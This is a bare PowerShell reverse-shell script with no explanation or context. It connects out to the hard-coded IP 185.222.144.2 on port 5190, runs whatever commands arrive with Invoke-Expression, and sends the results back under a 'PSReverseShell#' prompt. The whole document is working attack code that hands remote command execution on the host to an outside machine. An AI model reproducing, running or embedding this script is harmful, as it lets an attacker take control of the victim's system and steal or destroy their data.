$client = New-Object System.Net.Sockets.TCPClient('185.222.144.2', 5190)
$stream = $client.GetStream()
$buffer = New-Object byte[] 65535

while($true){$bytesRead=$stream.Read($buffer,0,$buffer.Length);if($bytesRead -le 0){break};$data=[System.Text.Encoding]::ASCII.GetString($buffer,0,$bytesRead);$output=iex $data 2>&1;$output+='PSReverseShell# ';$outputBytes=[System.Text.Encoding]::ASCII.GetBytes($output);$stream.Write($outputBytes,0,$outputBytes.Length);$stream.Flush()}

$client.Close()
